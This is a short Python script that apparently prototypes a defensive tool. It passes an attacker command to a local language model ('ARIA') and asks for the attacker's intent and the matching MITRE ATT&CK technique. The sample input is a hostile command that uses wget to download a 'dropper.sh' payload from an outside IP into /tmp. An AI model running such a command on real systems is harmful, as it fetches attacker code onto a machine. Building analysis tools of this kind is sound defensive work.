import ollama


def analyze_command(command):
    prompt = f"""
You are ARIA, a cybersecurity analyst.

Analyze this attacker command:

{command}

Return:
1. Attacker intent
2. MITRE ATT&CK technique
3. Why the technique applies

Keep the answer concise.
"""

    response = ollama.chat(
        model="qwen2.5:3b-instruct",
        messages=[
            {
                "role": "user",
                "content": prompt
            }
        ]
    )

    return response["message"]["content"]


if __name__ == "__main__":
    command = "wget http://198.51.100.55/dropper.sh -O /tmp/dropper.sh"

    result = analyze_command(command)

    print("\n=== ARIA LLM Analysis ===")
    print(result)
